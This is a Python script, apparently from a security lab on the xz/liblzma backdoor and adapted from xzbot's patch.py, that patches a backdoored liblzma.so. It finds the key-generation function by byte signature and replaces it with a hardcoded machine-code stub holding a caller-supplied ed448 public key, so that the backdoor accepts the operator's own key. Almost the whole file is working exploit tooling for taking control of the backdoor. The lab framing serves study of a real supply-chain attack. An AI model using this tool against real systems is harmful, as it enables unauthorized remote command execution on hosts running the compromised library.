#!/usr/bin/env python3
# patch_key.py — patch a backdoored liblzma.so to accept OUR ed448 public key.
#
# Derived from amlweems/xzbot's patch.py (MIT), generalized to take the public
# key on the command line instead of hardcoding xzbot's published seed=0 key.
# That is what lets Lab 2 use a FRESH, self-generated key (safety rule #4).
# Original: https://github.com/amlweems/xzbot  (see lab2-detonate/README.md)
#
# This version uses NO external dependencies (no pwntools): the replacement stub
# is a FIXED machine-code sequence (it does not depend on the key), so it is
# hardcoded here. The bytes were produced with binutils `as`/`objdump` from the
# exact instructions in xzbot's patch.py and verified to be 80 bytes, with
# `lea rsi,[rip+0x48]` pointing at offset 0x50 — i.e. immediately after the stub,
# where the 57-byte ed448 public key is appended.
#
# Usage:
#   python3 patch_key.py <liblzma.so.5.6.1> <ed448-pubkey-hex-114-chars>
# Writes <liblzma.so.5.6.1>.patch
import os
import sys

if len(sys.argv) != 3:
    print("usage: patch_key.py <liblzma.so> <ed448-pubkey-hex>")
    sys.exit(1)

path = sys.argv[1]
pubkey_hex = sys.argv[2].strip().lower()

if not os.path.exists(path):
    print(f"no such file: {path}")
    sys.exit(1)
# ed448 public key is 57 bytes = 114 hex chars.
if len(pubkey_hex) != 114 or any(c not in "0123456789abcdef" for c in pubkey_hex):
    print(f"bad pubkey hex (need 114 hex chars, got {len(pubkey_hex)})")
    sys.exit(1)

# Signature of generate_key() in the backdoored v5.6.x liblzma (from xzbot).
func = bytes.fromhex(
    "f30f1efa4885ff0f848e000000415455"
    "534889f34881eca00000004885f67504"
    "31c0eb6b4c8b4e084d85c974f34889e2"
    "31c0488d6c24304989fcb90c00000048"
    "89d74989e8be30000000f3abb91c0000"
    "004889eff3ab488d4c24204889d7"
)
flen = 160

# Fixed replacement stub: copies a static 57-byte key (appended below) into the
# output buffer and returns 1. Assembled from xzbot's instructions; see header.
#   push rsi; lea rsi,[rip+0x48]; 8x (mov rax,[rsi+N]; mov [rdi+N],rax);
#   mov eax,1; pop rsi; ret; nop; nop; nop
stub = bytes.fromhex(
    "56488d3548000000488b06488907488b460848894708"
    "488b461048894710488b461848894718488b4620488947"
    "20488b462848894728488b463048894730488b46384889"
    "4738b8010000005ec3909090"
)
assert len(stub) == 80, f"stub must be 80 bytes, got {len(stub)}"

# OUR ed448 public key (caller-supplied), not xzbot's seed=0 demo key.
p = stub + bytes.fromhex(pubkey_hex)
p += b"\x00" * (flen - len(p))

with open(path, "rb") as f:
    lzma = f.read()
if func not in lzma:
    print("Could not identify generate_key func — wrong/again-patched liblzma?")
    sys.exit(1)
off = lzma.index(func)
print("Patching func at offset: " + hex(off))
with open(path + ".patch", "wb") as f:
    f.write(lzma[:off] + p + lzma[off + flen:])
print("Generated patched so: " + path + ".patch")
